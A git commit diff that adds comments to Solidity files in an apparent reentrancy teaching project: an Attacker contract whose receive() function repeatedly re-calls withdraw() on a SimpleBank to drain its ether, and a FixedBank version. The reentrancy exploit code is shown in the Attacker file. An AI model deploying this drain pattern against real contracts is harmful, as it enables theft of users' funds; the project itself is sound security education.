647f991b471fb6fc7761be1ca2af3d7ee3dcc941
k2gutierrez <cchimal.gutierrez@gmail.com>
2026-07-09 16:56:26 -0600

    adding comments to functions

--- src/Attacker.sol
+++ src/Attacker.sol
@@ -4,12 +4,17 @@ pragma solidity 0.8.24;
 import { SimpleBank } from "./SimpleBank.sol";
 
 contract Attacker {
+
+    // Contract of the address as interface -> adding the address to attack in constructor
     SimpleBank simpleBank;
 
     constructor(address _simpleBankAddress) {
         simpleBank = SimpleBank(_simpleBankAddress);
     }
 
+    /**
+     * @dev function to attack the SimpleBank
+     */
     function attack() external payable {
         simpleBank.deposit{value: msg.value}();
         simpleBank.withdraw();
@@ -17,6 +22,9 @@ contract Attacker {
         require(success, "Transfer Failed");
     }
 
+    /**
+     * @dev receive function to create a loop to withdraw balance in case of a vulnerable contract
+     */
     receive() external payable {
         if (address(simpleBank).balance >= 1 ether) {
             simpleBank.withdraw();
--- src/FixedBank.sol
+++ src/FixedBank.sol
@@ -3,13 +3,20 @@ pragma solidity 0.8.24;
 
 contract FixedBank {
 
+    // User balance in contract
     mapping(address => uint256) public userBalance;
 
+    /**
+     * @dev deposit eth in contract
+     */
     function deposit() public payable {
         require(msg.value >= 1 ether, "Minimum deposit is 1 ETH");
         userBalance[msg.sender] += msg.value;
     }
 
+    /**
+     * @dev withdraw all the user balance from the contract
+     */
     function withdraw() public {
         require(userBalance[msg.sender] >= 1 ether, "User has not enough balance");
         require(address(this).balance > 0, "Ban is rekt");
@@ -21,6 +28,9 @@ contract FixedBank {
         require(success, "fail");
     }
 
+    /**
+     * @dev Function to know the total balance of the contract (Bank)
+     */
     function totalBalance() public view returns(uint) {
         return address(this).balance;
     }
